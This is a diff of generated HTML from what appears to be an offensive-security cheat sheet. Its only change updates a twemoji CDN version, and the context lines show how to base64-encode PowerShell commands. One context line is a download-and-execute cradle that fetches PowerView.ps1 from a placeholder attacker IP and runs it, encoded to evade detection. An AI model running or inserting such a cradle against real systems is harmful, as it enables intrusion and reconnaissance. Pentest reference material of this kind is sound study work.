@@ -6031,7 +6031,7 @@
 <a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nv">$bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
 <a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nv">$encodedCommand</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">)</span>
 </code></pre></div></li>
-<li>Linux: <img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@14.1.2/assets/svg/26a0.svg" title=":warning:" /> UTF-16LE encoding is required
+<li>Linux: <img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> UTF-16LE encoding is required
     <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">echo </span><span class="s1">&#39;IEX (New-Object Net.WebClient).DownloadString(&quot;http://10.10.10.10/PowerView.ps1&quot;)&#39;</span> <span class="p">|</span> <span class="n">iconv</span> <span class="n">-t</span> <span class="n">utf</span><span class="p">-</span><span class="n">16le</span> <span class="p">|</span> <span class="n">base64</span> <span class="n">-w</span> <span class="n">0</span>
 </code></pre></div></li>
 </ul>
